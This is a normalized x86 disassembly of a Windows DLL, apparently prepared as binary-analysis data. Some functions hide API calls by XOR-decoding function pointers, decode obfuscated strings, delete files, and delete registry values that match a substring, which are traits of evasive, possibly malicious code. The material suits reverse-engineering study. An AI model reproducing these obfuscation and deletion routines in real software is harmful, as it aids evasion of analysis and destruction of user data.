mov eax esi
lea edx [ eax + 0x2 ]
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edx
sar eax 0x1
lea edx [ eax + eax ]
push edx
push esi
lea eax [ ebp - 0x3d4 ]
push eax
jmp r-xdata
cmp [ ebp - 0x3dc ] edi
jmp r-xdata
mov eax [ ebp - 0x40c ]
push eax
call sub_1000a86e
add esp 0x4
lea edx [ ebp - 0x30 ]
push edx
push esi
call edi
test eax eax
je r-xdata
push 0x1
mov ecx 0x1
lea esi [ ebp - 0x428 ]
call sub_1003d800
add esp 0x4
mov ebx 0x8
push eax
lea ecx [ ebp - 0x3f0 ]
mov [ ebp - 0x4 ] bl
call sub_10033f90
mov [ ebp - 0x4 ] 0x6
cmp [ ebp - 0x414 ] ebx
jb r-xdata
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edx
sar eax 0x1
lea ecx [ eax + eax ]
push ecx
push esi
lea edx [ ebp - 0x3d4 ]
push edx
call sub_1007f580
add esp 0xc
push esi
call [ CharUpperW@IAT ]
mov esi eax
xor ebx ebx
jmp r-xdata
mov [ ebp - 0x40c ] bl
mov [ ebp - 0x3fc ] ebx
mov [ ebp - 0x3f8 ] 0xf
lea eax [ ebp - 0x20 ]
push eax
push esi
call edi
test eax eax
je r-xdata
lea edi [ ebp - 0x3d4 ]
call sub_10052500
test eax eax
jne r-xdata
lea edx [ ebp - 0x4bc ]
push edx
lea ebx [ ebp - 0x3f0 ]
lea ecx [ ebp - 0x4b8 ]
call sub_10041820
mov eax [ ebp - 0x4a0 ]
xor ebx ebx
add esp 0x4
cmp eax ebx
je r-xdata
mov ecx [ ebp - 0x428 ]
push ecx
call sub_1000a86e
add esp 0x4
jmp r-xdata
lea edx [ ebp - 0x70 ]
mov eax 0x41
call sub_10069020
lea edx [ ebp - 0x30 ]
mov eax 0x12a
call sub_10069020
lea edx [ ebp - 0x20 ]
mov eax 0xd8
call sub_10069020
lea edx [ ebp - 0x40 ]
mov eax 0x65
call sub_10069020
mov edi [ StrStrW@IAT ]
lea eax [ ebp - 0x70 ]
push eax
push esi
call edi
test eax eax
je r-xdata
lea eax [ ebp - 0x40 ]
push eax
push esi
call edi
test eax eax
je r-xdata
lea edi [ ebp - 0x3d4 ]
call sub_10052500
test eax eax
jne r-xdata
lea edx [ ebp - 0x15c ]
mov eax 0x18
call sub_10069020
lea edx [ ebp - 0x3f0 ]
push edx
lea edx [ ebp - 0x15c ]
call sub_10019010
jmp r-xdata
lea edx [ ebp - 0x420 ]
mov eax 0x89
mov [ ebp - 0x49c ] ebx
call sub_10069020
mov eax edx
push eax
lea ecx [ ebp - 0x47c ]
call sub_1004a920
mov [ ebp - 0x4 ] 0x9
mov edx [ ebp - 0x4a8 ]
push eax
lea esi [ ebp - 0x498 ]
call sub_100519f0
add esp 0x4
mov [ ebp - 0x4 ] 0xa
cmp [ eax + 0x14 ] 0x8
jb r-xdata
mov eax [ ebp - 0x4a8 ]
push eax
call [ DeleteFileW@IAT ]
mov esi [ ebp - 0x4ac ]
xor ecx ecx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] ebx
lea edx [ ebp - 0x3f0 ]
mov [ esi ] cx
push edx
mov ecx esi
call sub_10033f90
cmp [ ebp - 0x3f8 ] 0x10
jb r-xdata
push eax
push ebx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
push 0x1
mov ecx 0x1
lea esi [ ebp - 0x47c ]
call sub_1003d800
add esp 0x4
push eax
lea ecx [ ebp - 0x3f0 ]
mov [ ebp - 0x4 ] 0xf
call sub_10033f90
mov ecx esi
mov [ ebp - 0x4 ] 0x6
call sub_100702e0
lea edi [ ebp - 0x3d4 ]
call sub_10052500
test eax eax
jne r-xdata
lea edx [ ebp - 0xf4 ]
mov eax 0x30
call sub_10069020
lea edx [ ebp - 0x3f0 ]
push edx
lea edx [ ebp - 0xf4 ]
call sub_10019010
jmp r-xdata
lea edx [ ebp - 0x420 ]
mov eax 0xaa
mov [ ebp - 0x49c ] ebx
call sub_10069020
mov ecx edx
push ecx
lea ecx [ ebp - 0x498 ]
call sub_1004a920
mov [ ebp - 0x4 ] 0xb
mov edx [ ebp - 0x4a8 ]
push eax
lea esi [ ebp - 0x47c ]
call sub_100519f0
add esp 0x4
mov [ ebp - 0x4 ] 0xc
cmp [ eax + 0x14 ] 0x8
jb r-xdata
mov edx [ ebp - 0x4b0 ]
lea ecx [ ebp - 0x49c ]
push ecx
push edx
mov ecx eax
lea edx [ ebp - 0x3d4 ]
call sub_1005df30
add esp 0x8
test eax eax
lea ecx [ ebp - 0x498 ]
sete bl
call sub_100702e0
lea ecx [ ebp - 0x47c ]
mov [ ebp - 0x4 ] 0x6
call sub_100702e0
test bl bl
je r-xdata
mov eax [ eax ]
cmp [ ebp - 0x3dc ] 0x8
mov eax [ ebp - 0x40c ]
push eax
call sub_1000a86e
add esp 0x4
lea edx [ ebp - 0x104 ]
mov eax 0x111
call sub_10069020
lea ecx [ ebp - 0x3f0 ]
push ecx
call sub_10019010
jmp r-xdata
lea edx [ ebp - 0x420 ]
mov eax 0x130
mov [ ebp - 0x49c ] ebx
call sub_10069020
mov ecx edx
push ecx
lea ecx [ ebp - 0x498 ]
call sub_1004a920
mov [ ebp - 0x4 ] 0xd
mov edx [ ebp - 0x4a8 ]
push eax
lea esi [ ebp - 0x47c ]
call sub_100519f0
add esp 0x4
mov [ ebp - 0x4 ] 0xe
cmp [ eax + 0x14 ] 0x8
jb r-xdata
mov ecx [ ebp - 0x4b0 ]
lea edx [ ebp - 0x49c ]
push edx
push ecx
mov ecx eax
lea edx [ ebp - 0x3d4 ]
call sub_1006f300
add esp 0x8
test eax eax
lea ecx [ ebp - 0x47c ]
sete bl
call sub_100702e0
lea ecx [ ebp - 0x498 ]
mov [ ebp - 0x4 ] 0x6
call sub_100702e0
test bl bl
je r-xdata
mov eax [ eax ]
lea edx [ ebp - 0x15c ]
mov eax 0x18
call sub_10069020
lea ecx [ ebp - 0x3f0 ]
push ecx
call sub_10019010
jmp r-xdata
lea eax [ ebp - 0x3f0 ]
push eax
mov ecx [ ebp - 0x4b0 ]
lea edx [ ebp - 0x49c ]
push edx
push ecx
mov ecx eax
lea edx [ ebp - 0x3d4 ]
call sub_1001ea50
add esp 0x8
test eax eax
lea ecx [ ebp - 0x47c ]
sete bl
call sub_100702e0
lea ecx [ ebp - 0x498 ]
mov [ ebp - 0x4 ] 0x6
call sub_100702e0
test bl bl
je r-xdata
mov eax [ eax ]
lea edx [ ebp - 0xf4 ]
mov eax 0x30
call sub_10069020
lea ecx [ ebp - 0x3f0 ]
push ecx
call sub_10019010
jmp r-xdata
lea edx [ ebp - 0x3f0 ]
push edx
mov edx [ ebp - 0x49c ]
call sub_10019010
mov eax [ ebp - 0x49c ]
push eax
call [ SysFreeString@IAT ]
jmp r-xdata
lea edx [ ebp - 0x104 ]
mov eax 0x111
call sub_10069020
lea eax [ ebp - 0x3f0 ]
push eax
call sub_10019010
jmp r-xdata
lea edx [ ebp - 0x3f0 ]
push edx
jmp r-xdata
mov esi [ ebp - 0x49c ]
mov edx esi
call sub_10019010
push esi
call [ SysFreeString@IAT ]
jmp r-xdata
sub_1005da7a
push 0x4c
mov eax sub_10085d66
call sub_10047689
mov eax [ ebp + 0x20 ]
mov ebx [ ebp + 0x8 ]
mov edi [ ebp + 0x24 ]
push eax
push [ ebp + 0x1c ]
lea eax [ ebp + 0x14 ]
push eax
mov esi ecx
mov ecx [ ebp + 0x28 ]
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x2c ]
mov [ ebp - 0x50 ] ecx
push eax
mov ecx esi
mov [ ebp - 0x58 ] ebx
call sub_10016af3
and [ ebp - 0x4 ] 0x0
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_1002839c
test al al
je r-xdata
cmp [ ebp - 0x1c ] 0x0
jne r-xdata
or [ edi ] 0x1
add esi 0x8
push esi
push 0x0
push 0x30
call sub_10032181
xor esi esi
add esp 0xc
movzx ebx ax
mov [ ebp - 0x34 ] 0xf
mov [ ebp - 0x38 ] esi
mov [ ebp - 0x48 ] 0x0
push [ ebp - 0x1c ]
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x4 ] 0x1
call sub_10053fd0
cmp [ ebp - 0x18 ] 0x8
mov eax [ ebp - 0x2c ]
jae r-xdata
or [ edi ] 0x2
jmp r-xdata
cmp [ eax ] bx
jb r-xdata
lea eax [ ebp - 0x2c ]
mov eax [ ebp + 0xc ]
mov [ ebx ] eax
mov eax [ ebp + 0x10 ]
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
mov [ ebx + 0x4 ] eax
call sub_10069470
mov eax ebx
call sub_100262c3
retn 0x24
xor esi esi
push 0x2d
inc esi
push esi
lea ecx [ ebp - 0x48 ]
call sub_10042a70
jmp r-xdata
cmp [ ebp - 0x18 ] 0x8
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp esi [ ebp - 0x1c ]
jb r-xdata
movzx eax [ eax ]
lea ecx [ ebx + 0x9 ]
cmp ecx eax
jge r-xdata
lea eax [ ebp - 0x2c ]
cmp [ ebp - 0x18 ] 0x8
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ ebp - 0x34 ] 0x10
mov esi [ ebp - 0x48 ]
jae r-xdata
mov al [ eax + esi * 2 ]
sub al bl
add al 0x30
movzx eax al
push eax
push 0x1
lea ecx [ ebp - 0x48 ]
call sub_10042a70
inc esi
lea eax [ ebp - 0x2c ]
lea eax [ ebp - 0x4c ]
push eax
xor ebx ebx
push ebx
lea eax [ ebp - 0x54 ]
push eax
push esi
mov [ ebp - 0x4c ] ebx
call sub_1001f911
add esp 0x10
cmp [ ebp - 0x54 ] esi
je r-xdata
lea esi [ ebp - 0x48 ]
or [ edi ] 0x2
fstp st0
cmp [ ebp - 0x4c ] ebx
jne r-xdata
mov eax [ ebp - 0x50 ]
fstp [ eax ]
jmp r-xdata
push ebx
push 0x1
lea ecx [ ebp - 0x48 ]
call sub_10005b50
mov ebx [ ebp - 0x58 ]
sub_1005dbf0
push ebp
mov ebp esp
mov edx 0x30c
mov ecx esi
xor eax eax
lea esp [ esp ]
test edx edx
jne r-xdata
add ecx 0x2
dec edx
jne r-xdata
mov ecx 0x30c
sub ecx edx
jmp r-xdata
mov eax 0x80070057
xor ecx ecx
cmp [ ecx ] ax
je r-xdata
jmp r-xdata
test eax eax
js r-xdata
pop ebp
retn 0x4
mov eax 0x30c
sub eax ecx
lea ecx [ esi + ecx * 2 ]
mov edx 0x7fffffff
pop ebp
jmp sub_10072780
sub_1005dc40
push ebp
mov ebp esp
push 0xffffffff
push sub_1008716e
mov eax [ fs : 0x0 ]
push eax
sub esp 0x28
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
xor eax eax
mov [ edi ] al
mov esi [ edx + 0x4 ]
lea ecx [ edi + 0x4 ]
mov [ ecx ] esi
mov [ edi + 0x1c ] 0xf
mov [ edi + 0x18 ] eax
mov [ ebp - 0x34 ] edi
mov [ ebp - 0x30 ] edx
mov [ edi + 0x8 ] al
mov [ ebp - 0x4 ] eax
mov [ edi + 0x24 ] eax
mov [ edi + 0x28 ] eax
mov edx [ edx + 0x14 ]
mov [ edi + 0x2c ] edx
mov [ edi + 0x30 ] eax
mov [ edi + 0x34 ] eax
mov [ edi + 0x38 ] eax
mov [ edi + 0x3c ] eax
push 0x4
lea esi [ ebp - 0x2c ]
mov [ ebp - 0x4 ] 0x1
call sub_100662b0
add esp 0x4
push eax
lea ecx [ edi + 0x8 ]
mov [ ebp - 0x4 ] 0x2
call sub_1003acf0
mov [ ebp - 0x4 ] 0x1
cmp [ ebp - 0x18 ] 0x10
jb r-xdata
mov ecx [ edi + 0x2c ]
push ecx
push 0x8
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov [ edi + 0x24 ] eax
mov eax [ ebp - 0x30 ]
push edi
mov [ edi ] 0x1
call sub_100699f0
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x2c ]
push eax
call sub_1000a86e
add esp 0x4
sub_1005dd20
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov edx [ eax + 0x14 ]
mov ecx [ eax ]
mov [ eax + 0x20 ] edx
mov edx [ eax + 0x18 ]
mov [ eax + 0x4 ] ecx
mov ecx [ eax + 0x1c ]
mov [ eax + 0x24 ] edx
mov [ eax + 0x28 ] ecx
pop ebp
retn
sub_1005dd50
push ebp
mov ebp esp
sub esp 0x234
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
push edi
push 0x104
mov edi ecx
mov ecx [ edi + 0x4 ]
lea eax [ ebp - 0x228 ]
push eax
push ecx
mov [ ebp - 0x234 ] 0x0
call [ ExpandEnvironmentStringsW@IAT ]
mov edx [ rw-data ]
push 0x0
push 0x80
push 0x3
push 0x0
push 0x0
mov [ ebp - 0x22c ] edx
mov bl 0x38
xor [ ebp - 0x22c ] bl
xor [ ebp - 0x22b ] bl
xor [ ebp - 0x22a ] bl
xor [ ebp - 0x229 ] bl
push 0x80000000
lea eax [ ebp - 0x228 ]
push eax
call [ ebp - 0x22c ]
mov esi eax
cmp esi 0xffffffff
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10032529
mov esp ebp
pop ebp
retn
push 0x0
push esi
call [ GetFileSize@IAT ]
mov [ ebp - 0x230 ] eax
push esi
cmp eax 0xffffffff
jne r-xdata
mov edx [ rw-data ]
mov [ ebp - 0x22c ] edx
xor [ ebp - 0x22c ] bl
xor [ ebp - 0x22b ] bl
xor [ ebp - 0x22a ] bl
xor [ ebp - 0x229 ] bl
call [ ebp - 0x22c ]
cmp [ ebp - 0x230 ] 0x1e84800
jae r-xdata
mov ecx [ rw-data ]
mov [ ebp - 0x22c ] ecx
xor [ ebp - 0x22c ] bl
xor [ ebp - 0x22b ] bl
xor [ ebp - 0x22a ] bl
xor [ ebp - 0x229 ] bl
call [ ebp - 0x22c ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x228 ]
push edx
mov ecx edi
call sub_100562b0
test eax eax
jne r-xdata
lea eax [ ebp - 0x230 ]
push eax
lea ecx [ ebp - 0x234 ]
push ecx
lea eax [ ebp - 0x228 ]
call sub_100505a0
add esp 0x8
test eax eax
jne r-xdata
lea edx [ ebp - 0x14 ]
mov eax 0x37
call sub_10069020
mov ebx edx
lea edx [ ebp - 0x1c ]
mov eax 0x27
call sub_10069020
mov ebx edx
jmp r-xdata
lea edx [ ebp - 0x14 ]
mov eax 0x37
call sub_10069020
mov ebx edx
call sub_10007910
xor edi edi
lea edx [ ebp - 0x1c ]
mov eax 0x27
call sub_10069020
mov ebx edx
call sub_10007910
jmp r-xdata
call sub_10007910
mov esi [ ebp - 0x234 ]
mov ecx [ ebp - 0x230 ]
push edi
mov edx esi
call sub_10016920
push esi
call [ LocalFree@IAT ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
sub_1005df30
push ebp
mov ebp esp
push 0xffffffff
push sub_100886b3
mov eax [ fs : 0x0 ]
push eax
sub esp 0x134
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x13c ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x140 ] ecx
mov ecx [ r--data ]
mov [ ebp - 0x138 ] eax
movsx eax [ ecx ]
xor eax 0xffa4
xor ecx ecx
and eax 0xff
mov [ ebp - 0x12c ] ax
mov [ ebp - 0x12a ] cx
mov ecx [ r--data ]
xor edi edi
xor eax eax
movsx esi [ ecx + eax ]
xor esi eax
xor esi 0x28
and esi 0xff
mov [ ebp + eax * 2 - 0x20 ] si
inc eax
cmp eax 0x2
jb r-xdata
xor eax eax
mov [ ebp - 0x1c ] ax
xor ecx ecx
mov eax edx
mov [ ebp - 0xdc ] 0x7
mov [ ebp - 0xe0 ] edi
mov [ ebp - 0xf0 ] cx
lea esi [ eax + 0x2 ]
mov cx [ eax ]
add eax 0x2
cmp cx di
jne r-xdata
sub eax esi
sar eax 0x1
push eax
push edx
lea ecx [ ebp - 0xf0 ]
call sub_10034100
lea edx [ ebp - 0xf0 ]
push edx
lea edx [ ebp - 0x12c ]
lea esi [ ebp - 0x128 ]
mov [ ebp - 0x4 ] edi
call sub_10040e00
add esp 0x4
push eax
lea edx [ ebp - 0x20 ]
lea esi [ ebp - 0x10c ]
mov [ ebp - 0x4 ] 0x1
call sub_100519f0
add esp 0x4
mov ebx 0x8
cmp [ ebp - 0x114 ] ebx
jb r-xdata
mov esi 0x7
xor ecx ecx
mov [ ebp - 0x114 ] esi
mov [ ebp - 0x118 ] edi
mov [ ebp - 0x128 ] cx
mov [ ebp - 0x4 ] 0x4
cmp [ ebp - 0xdc ] ebx
jb r-xdata
mov eax [ ebp - 0x128 ]
push eax
call sub_1000a86e
add esp 0x4
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0xdc ] esi
mov [ ebp - 0xe0 ] edi
mov [ ebp - 0xf0 ] ax
lea ecx [ ecx ]
mov edx [ ebp - 0xf0 ]
push edx
call sub_1000a86e
add esp 0x4
movsx edx [ eax + ecx ]
xor edx eax
xor edx 0x28
and edx 0xff
mov [ ebp + eax * 2 - 0x80 ] dx
inc eax
cmp eax 0x2c
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x28 ] ax
jmp r-xdata
movsx edx [ eax + ecx ]
xor edx eax
xor edx 0xffde
and edx 0xff
mov [ ebp + eax * 2 - 0x18 ] dx
inc eax
cmp eax 0x2
jb r-xdata
xor eax eax
mov [ ebp - 0x88 ] esi
mov esi [ ebp - 0x13c ]
mov [ ebp - 0x14 ] ax
xor ecx ecx
mov eax esi
mov [ ebp - 0x8c ] edi
mov [ ebp - 0x9c ] cx
lea edx [ eax + 0x2 ]
mov cx [ eax ]
add eax 0x2
cmp cx di
jne r-xdata
sub eax edx
sar eax 0x1
push eax
push esi
lea ecx [ ebp - 0x9c ]
call sub_10034100
lea edx [ ebp - 0x9c ]
push edx
lea edx [ ebp - 0x80 ]
lea esi [ ebp - 0xb8 ]
mov [ ebp - 0x4 ] 0x5
call sub_10040e00
add esp 0x4
push eax
lea edx [ ebp - 0x18 ]
lea esi [ ebp - 0xd4 ]
mov [ ebp - 0x4 ] 0x6
call sub_100519f0
add esp 0x4
push 0xffffffff
push edi
push eax
lea ecx [ ebp - 0x10c ]
mov [ ebp - 0x4 ] 0x7
call sub_1006da10
cmp [ ebp - 0xc0 ] ebx
jb r-xdata
xor ecx ecx
mov esi 0x7
mov [ ebp - 0xc0 ] esi
mov [ ebp - 0xc4 ] edi
mov [ ebp - 0xd4 ] cx
cmp [ ebp - 0xa4 ] ebx
jb r-xdata
mov eax [ ebp - 0xd4 ]
push eax
call sub_1000a86e
add esp 0x4
xor eax eax
mov [ ebp - 0x4 ] 0x4
mov [ ebp - 0xa4 ] esi
mov [ ebp - 0xa8 ] edi
mov [ ebp - 0xb8 ] ax
cmp [ ebp - 0x88 ] ebx
jb r-xdata
mov edx [ ebp - 0xb8 ]
push edx
call sub_1000a86e
add esp 0x4
mov edx [ r--data ]
movsx eax [ edx ]
mov edx [ r--data ]
xor eax 0x64
and eax 0xff
xor ecx ecx
mov [ ebp - 0x130 ] ax
mov [ ebp - 0x12e ] cx
movsx eax [ edx ]
xor eax 0xffdc
and eax 0xff
mov [ ebp - 0x88 ] esi
mov esi [ ebp - 0x140 ]
xor edx edx
mov [ ebp - 0x134 ] ax
mov eax esi
mov [ ebp - 0x9c ] dx
mov [ ebp - 0x132 ] cx
mov [ ebp - 0x8c ] edi
lea edx [ eax + 0x2 ]
mov edi edi
mov ecx [ ebp - 0x9c ]
push ecx
call sub_1000a86e
add esp 0x4
mov cx [ eax ]
add eax 0x2
cmp cx di
jne r-xdata
sub eax edx
sar eax 0x1
push eax
push esi
lea ecx [ ebp - 0x9c ]
call sub_10034100
lea eax [ ebp - 0x9c ]
push eax
lea edx [ ebp - 0x130 ]
lea esi [ ebp - 0xd4 ]
mov [ ebp - 0x4 ] bl
call sub_10040e00
add esp 0x4
push eax
lea edx [ ebp - 0x134 ]
lea esi [ ebp - 0xb8 ]
mov [ ebp - 0x4 ] 0x9
call sub_100519f0
add esp 0x4
push 0xffffffff
push edi
push eax
lea ecx [ ebp - 0x10c ]
mov [ ebp - 0x4 ] 0xa
call sub_1006da10
cmp [ ebp - 0xa4 ] ebx
jb r-xdata
xor edx edx
mov esi 0x7
mov [ ebp - 0xa4 ] esi
mov [ ebp - 0xa8 ] edi
mov [ ebp - 0xb8 ] dx
cmp [ ebp - 0xc0 ] ebx
jb r-xdata
mov ecx [ ebp - 0xb8 ]
push ecx
call sub_1000a86e
add esp 0x4
xor ecx ecx
mov [ ebp - 0xc0 ] esi
mov [ ebp - 0xc4 ] edi
mov [ ebp - 0xd4 ] cx
cmp [ ebp - 0x88 ] ebx
jb r-xdata
mov eax [ ebp - 0xd4 ]
push eax
call sub_1000a86e
add esp 0x4
mov ecx [ ebp - 0x10c ]
cmp [ ebp - 0xf8 ] ebx
jae r-xdata
mov edx [ ebp - 0x9c ]
push edx
call sub_1000a86e
add esp 0x4
mov eax [ ebp - 0x138 ]
push eax
call sub_10069160
add esp 0x4
mov esi eax
cmp [ ebp - 0xf8 ] ebx
jb r-xdata
lea ecx [ ebp - 0x10c ]
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x10c ]
push ecx
call sub_1000a86e
add esp 0x4
sub_1005e390
push ebp
mov ebp esp
push 0xffffffff
push sub_10087a06
mov eax [ fs : 0x0 ]
push eax
push ecx
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
xor eax eax
mov [ ebp - 0x10 ] rw-data
mov [ rw-data ] r--data
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ ebp - 0x4 ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ ebp - 0x4 ] 0x1
xor ecx ecx
push eax
mov [ rw-data ] cx
push r--data
mov ecx rw-data
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] 0x7
mov [ rw-data ] eax
call sub_10034100
mov eax rw-data
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn
sub_1005e436
mov edi edi
push ebp
mov ebp esp
sub esp 0x54
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x1c ]
push ebx
mov ebx [ ebp + 0x24 ]
and [ ebp - 0x44 ] 0x0
and [ ebp - 0x48 ] 0x0
push esi
mov esi [ ebp + 0x20 ]
push edi
mov edi [ ebp + 0x8 ]
lea edx [ ebp - 0x44 ]
push edx
lea edx [ ebp - 0x48 ]
push edx
push eax
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x40 ]
push eax
push ecx
call sub_10020869
add esp 0x18
push eax
lea eax [ ebp - 0x4c ]
push eax
lea eax [ ebp - 0x40 ]
push eax
call sub_10024808
fstp [ ebp - 0x54 ]
mov eax [ ebp - 0x48 ]
add esp 0x10
test eax eax
je r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_1006995b
test al al
je r-xdata
fld [ ebp - 0x54 ]
shl eax 0x2
push eax
push ecx
push ecx
fstp [ esp ]
call sub_1002262f
fstp [ ebp - 0x54 ]
add esp 0xc
lea eax [ ebp - 0x40 ]
cmp [ ebp - 0x4c ] eax
je r-xdata
or [ esi ] 0x1
or [ esi ] 0x2
cmp [ ebp - 0x44 ] 0x0
jne r-xdata
fld [ ebp - 0x54 ]
fstp [ ebx ]
jmp r-xdata
mov eax [ ebp + 0xc ]
mov ecx [ ebp - 0x4 ]
mov [ edi ] eax
mov eax [ ebp + 0x10 ]
mov [ edi + 0x4 ] eax
mov eax edi
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10032529
leave
retn 0x20
sub_1005e4f8
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x10 ]
call sub_10051cf5
mov ecx [ ebp + 0x10 ]
xor ebx ebx
cmp ecx ebx
jne r-xdata
cmp [ ebp + 0x8 ] ebx
jne r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp [ ebp + 0xc ] ebx
je r-xdata
call sub_1005b670
mov [ eax ] 0x16
call sub_1004b131
cmp [ ebp - 0x4 ] bl
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
push esi
mov esi 0x7fffffff
cmp ecx esi
jbe r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
pop ebx
leave
retn
mov eax [ ebp - 0xc ]
cmp [ eax + 0x8 ] ebx
jne r-xdata
call sub_1005b670
mov [ eax ] 0x16
call sub_1004b131
jmp r-xdata
push [ eax + 0x4 ]
push ecx
push [ ebp + 0xc ]
push ecx
push [ ebp + 0x8 ]
push 0x1001
push [ eax + 0xc ]
lea eax [ ebp - 0x10 ]
push eax
call sub_1001cd1a
add esp 0x20
cmp eax ebx
jne r-xdata
push [ ebp + 0x14 ]
push ecx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_100602f1
add esp 0x10
jmp r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
add eax 0xfffffffe
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax esi
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
pop esi
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_1005e5d6
mov edi edi
push ebp
mov ebp esp
sub esp 0x54
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x1c ]
push ebx
mov ebx [ ebp + 0x24 ]
and [ ebp - 0x44 ] 0x0
and [ ebp - 0x48 ] 0x0
push esi
mov esi [ ebp + 0x20 ]
push edi
mov edi [ ebp + 0x8 ]
lea edx [ ebp - 0x44 ]
push edx
lea edx [ ebp - 0x48 ]
push edx
push eax
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x40 ]
push eax
push ecx
call sub_100315c0
add esp 0x18
push eax
lea eax [ ebp - 0x4c ]
push eax
lea eax [ ebp - 0x40 ]
push eax
call sub_10024808
fstp [ ebp - 0x54 ]
mov eax [ ebp - 0x48 ]
add esp 0x10
test eax eax
je r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_1002839c
test al al
je r-xdata
fld [ ebp - 0x54 ]
shl eax 0x2
push eax
push ecx
push ecx
fstp [ esp ]
call sub_1002262f
fstp [ ebp - 0x54 ]
add esp 0xc
lea eax [ ebp - 0x40 ]
cmp [ ebp - 0x4c ] eax
je r-xdata
or [ esi ] 0x1
or [ esi ] 0x2
cmp [ ebp - 0x44 ] 0x0
jne r-xdata
fld [ ebp - 0x54 ]
fstp [ ebx ]
jmp r-xdata
mov eax [ ebp + 0xc ]
mov ecx [ ebp - 0x4 ]
mov [ edi ] eax
mov eax [ ebp + 0x10 ]
mov [ edi + 0x4 ] eax
mov eax edi
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10032529
leave
retn 0x20
sub_1005e6a0
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
push esi
xor esi esi
cmp [ eax ] esi
jbe r-xdata
pop esi
pop ebp
retn
lea ecx [ ecx ]
mov edx [ ebp + 0x10 ]
inc esi
cmp esi [ edx ]
jb r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov edx [ ebp + 0x18 ]
push ecx
push edx
call [ StrStrW@IAT ]
test eax eax
je r-xdata
mov ecx [ ebp + 0x18 ]
mov edx [ ebp + 0x1c ]
mov eax [ ebp + 0xc ]
push edi
push ecx
push 0x0
push 0x0
push ebx
mov [ ebx ] 0xff
push edx
mov [ edi ] 0x208
mov ecx [ eax ]
push esi
push ecx
call [ RegEnumValueW@IAT ]
mov edx [ ebp + 0x14 ]
mov [ edx ] eax
test eax eax
jne r-xdata
mov eax [ ebp + 0x1c ]
mov ecx [ ebp + 0xc ]
mov edx [ ecx ]
push eax
push edx
call [ RegDeleteValueW@IAT ]
mov ecx [ ebp + 0x14 ]
mov [ ecx ] eax
sub_1005e720
push ebp
mov ebp esp
sub esp 0xe0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov ecx [ r--data ]
xor eax eax
jmp r-xdata
